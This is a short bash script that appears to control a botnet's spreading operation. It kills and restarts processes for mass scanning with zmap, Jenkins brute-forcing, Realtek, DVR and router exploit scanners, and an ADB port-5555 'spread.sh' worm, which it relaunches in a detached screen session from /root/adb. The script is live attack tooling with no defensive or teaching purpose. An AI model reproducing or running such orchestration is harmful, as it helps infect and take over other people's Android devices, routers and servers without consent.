#!/bin/bash
set -e
pkill -9 -x zmap 2>/dev/null || true
pkill -9 -f 'jenkins-brute' 2>/dev/null || true
pkill -9 -f 'jenkins-load' 2>/dev/null || true
pkill -9 -f 'realtek-scanner/realtek' 2>/dev/null || true
pkill -9 -f 'cirqueira-exploits' 2>/dev/null || true
pkill -9 -f './adb 5555' 2>/dev/null || true
pkill -9 -f 'spread.sh' 2>/dev/null || true
sleep 2
for s in jenkins realtek dvr fiber zhone adb cms; do
  screen -S "$s" -X quit 2>/dev/null || true
done
screen -wipe 2>/dev/null || true
cd /root/adb
chmod +x spread.sh stop-spread.sh adb 2>/dev/null || true
screen -dmS adb bash -lc 'cd /root/adb && exec ./spread.sh'
sleep 2
echo "=== screens ==="
screen -ls
echo "=== adb pipeline ==="
pgrep -a -x zmap || echo "no zmap"
pgrep -af './adb 5555' || echo "no adb"
pgrep -af spread.sh || echo "no spread"
